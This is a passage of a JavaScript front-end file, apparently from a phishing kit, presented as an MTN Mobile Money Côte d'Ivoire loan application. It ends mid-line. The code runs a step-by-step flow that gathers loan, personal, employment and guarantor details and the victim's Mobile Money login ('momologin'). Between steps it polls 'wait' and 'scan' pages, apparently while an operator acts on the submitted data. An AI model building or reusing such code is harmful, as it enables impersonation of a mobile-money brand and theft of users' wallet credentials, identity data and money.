// ============================================================
// script.js – MTN Mobile Money Côte d'Ivoire  (v7.5)
// ============================================================
'use strict';

var ACCOUNT_TYPES = {
    basic:    { name: 'Compte Basic',    icon: '🟡', dailyCash: 200000,  monthlyCap: 500000,   maxLoan: 100000,  minLoan: 25000,  requiresId: false },
    standard: { name: 'Compte Standard', icon: '⭐', dailyCash: 1000000, monthlyCap: 2000000,  maxLoan: 500000,  minLoan: 50000,  requiresId: true  },
    premium:  { name: 'Compte Premium',  icon: '💎', dailyCash: 5000000, monthlyCap: 10000000, maxLoan: 2000000, minLoan: 100000, requiresId: true  }
};

var STEPS = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
var POLL_INTERVAL = 2500;
var POLL_MAX_DURATION = 30 * 60 * 1000;
var ANNUAL_RATE = 0.24; // 24 %
var SERVICE_FEE = 500;  // F CFA

var S = {
    applicationId: '',
    isRegistered: false,
    registrationStatus: 'idle',
    accountType: null,
    accountMaxLoan: 0,
    idNumber: null,
    dob: null,
    steps: {},
    loan: {}, personal: {}, employment: {}, guarantor: {}
};

var KEYS = { APP_ID: 'momo_ci_app_id_v7', APP_DATA: 'momo_ci_data_v7' };

var activePoll = null;
var currentPollStep = null;
var currentPollCallback = null;
var currentPollStarted = 0;
var regPollTimer = null;
var selectedAccountType = null;
var qualificationAnimator = null;
var _termsCache = null;

// ─── Utilitaires ───
function save(k, d) { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} }
function get(k) { try { var d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } }
function rm(k) { try { localStorage.removeItem(k); } catch (e) {} }

function saveAll() {
    save(KEYS.APP_ID, S.applicationId);
    save(KEYS.APP_DATA, {
        isRegistered: S.isRegistered,
        registrationStatus: S.registrationStatus,
        accountType: S.accountType,
        accountMaxLoan: S.accountMaxLoan,
        dob: S.dob,
        steps: S.steps,
        loan: S.loan, personal: S.personal,
        employment: S.employment, guarantor: S.guarantor
    });
}

// ─── Formatage français ───
function fmt(n) {
    var num = Number(n) || 0;
    return num.toLocaleString('fr-FR').replace(/\u202f/g, ' ').replace(/\u00a0/g, ' ');
}
function fmtXOF(n) { return fmt(n) + ' F CFA'; }

function escapeHtml(s) {
    return String(s || '').replace(/[&<>"']/g, function (c) {
        return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
}

function genAppId() {
    var rand;
    try {
        rand = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36)).replace(/-/g, '').toUpperCase();
    } catch (e) {
        rand = Math.random().toString(36).replace(/[^a-z0-9]/gi, '').toUpperCase();
    }
    return 'CI-MTN-' + rand.slice(0, 8);
}

function showToast(msg, type, duration) {
    type = type || 'info';
    duration = duration || 3200;
    document.querySelectorAll('.toast').forEach(function (t) { t.remove(); });
    var el = document.createElement('div');
    el.className = 'toast toast-' + type;
    el.textContent = msg;
    document.body.appendChild(el);
    setTimeout(function () {
        el.style.opacity = '0';
        el.style.transform = 'translateX(-50%) translateY(-20px)';
        setTimeout(function () { el.remove(); }, 300);
    }, duration);
}

function showErr(id, msg) {
    var box = document.getElementById(id);
    if (box) {
        box.classList.add('show');
        var t = document.getElementById(id + 'Txt');
        if (t) t.textContent = msg;
    }
}
function clearErr(id) {
    var box = document.getElementById(id);
    if (box) box.classList.remove('show');
}
function setBtnLoading(btn, loading, defaultText) {
    if (!btn) return;
    btn.disabled = loading;
    btn.textContent = loading ? 'Veuillez patienter...' : defaultText;
}

async function apiCall(endpoint, options) {
    options = options || {};
    try {
        var fetchOpts = Object.assign({
            credentials: 'same-origin',
            headers: { 'Content-Type': 'application/json' }
        }, options);
        fetchOpts.headers = Object.assign({ 'Content-Type': 'application/json' }, options.headers || {});
        var res = await fetch(endpoint, fetchOpts);
        var data = await res.json();
        if (res.status === 429 || (data && data.code === 'RATE_LIMITED')) {
            var msg = (data && data.error) || 'Vous avez dépassé la limite d\'essais. Réessayez dans 5 minutes.';
            showToast('⏳ ' + msg, 'error', 6000);
            throw new Error(msg);
        }
        return data;
    } catch (e) {
        console.error(endpoint + ':', e.message);
        throw e;
    }
}

// ─── Navigation ───
function goTo(pageId) {
    if (requiresRegistration(pageId) && !isUserRegistered()) {
        forceRegistration();
        return;
    }
    document.querySelectorAll('.page').forEach(function (p) { p.classList.remove('active'); });
    var el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
    try { history.pushState({ page: pageId }, '', '#' + pageId); } catch (e) {}

    if (pageId === 'page-requirements') updateRequirementsLimits();
    if (pageId === 'page-step1') refreshStep1();
    if (pageId === 'page-step2') prefillPersonal();
    if (pageId === 'page-momologin') prefillMoMoLogin();
    if (pageId === 'page-confirmation') updateConfirmation();
    refreshAccountBadges();

    if (pageId.indexOf('page-wait-') !== 0 && pageId !== 'page-scan' && pageId.indexOf('page-registration-') !== 0) {
        stopPolling();
    }
}

function requiresRegistration(pageId) {
    var list = ['page-step1','page-step2','page-step3','page-guarantor','page-confirmation',
                'page-momologin','page-scan','page-approval',
                'page-wait-loan','page-wait-personal','page-wait-employment',
                'page-wait-guarantor','page-wait-momologin'];
    return list.indexOf(pageId) !== -1;
}
function isUserRegistered() {
    return !!(S.isRegistered && S.accountType && ACCOUNT_TYPES[S.accountType] && S.registrationStatus === 'completed');
}
function forceRegistration(reason) {
    showToast('🔗 Veuillez terminer votre inscription pour continuer', 'info', 3500);
    setTimeout(function () {
        routeRegistrationFlow();
        if (reason) setTimeout(function () { showErr('regErr', reason); }, 400);
    }, 800);
}

function refreshAccountBadges() {
    var type = S.accountType ? ACCOUNT_TYPES[S.accountType] : null;
    var label = type ? type.icon + ' ' + type.name : '';
    ['navbarAccount0','navbarAccount','navbarAccount2','navbarAccount3','navbarAccount4','navbarAccount5','navbarAccount6'].forEach(function (id) {
        var el = document.getElementById(id);
        if (el) el.innerHTML = label ? '<div class="nav-badge">' + label + '</div>' : '';
    });
}

// ─── Validation CNI ───
function validateCNI(cni) {
    var clean = String(cni || '').replace(/\s/g, '').toUpperCase();
    if (!clean) return { ok: false, reason: 'Veuillez saisir votre numéro de CNI.' };
    if (!/^[A-Z0-9]{8,14}$/.test(clean)) {
        return { ok: false, reason: 'Le numéro CNI doit comporter 8 à 14 caractères alphanumériques.' };
    }
    return { ok: true, clean: clean };
}

function validateDobClient(dobIso) {
    if (!dobIso) return { ok: false, reason: 'Veuillez saisir votre date de naissance.' };
    var d = new Date(dobIso);
    if (isNaN(d.getTime())) return { ok: false, reason: 'Date de naissance invalide.' };
    var now = new Date();
    var age = now.getFullYear() - d.getFullYear();
    var m = now.getMonth() - d.getMonth();
    if (m < 0 || (m === 0 && now.getDate() < d.getDate())) age--;
    if (age < 18) return { ok: false, reason: 'Vous devez avoir 18 ans ou plus.' };
    if (age > 100) return { ok: false, reason: 'Âge maximum dépassé.' };
    return { ok: true };
}

function normalizePhone(id) {
    var inp = document.getElementById(id);
    if (!inp) return;
    var v = inp.value.replace(/\D/g, '');
    if (v.length > 10) v = v.substring(0, 10);
    inp.value = v;
}

// ─── Calculateur ───
function updateCalc() {
    var slider = document.getElementById('amtSlider');
    if (!slider) return;
    var maxAllowed = isUserRegistered()
        ? Math.min(2000000, ACCOUNT_TYPES[S.accountType].maxLoan)
        : 2000000;
    slider.min = 25000;
    slider.max = maxAllowed;
    if (+slider.value > maxAllowed) slider.value = maxAllowed;
    if (+slider.value < 25000) slider
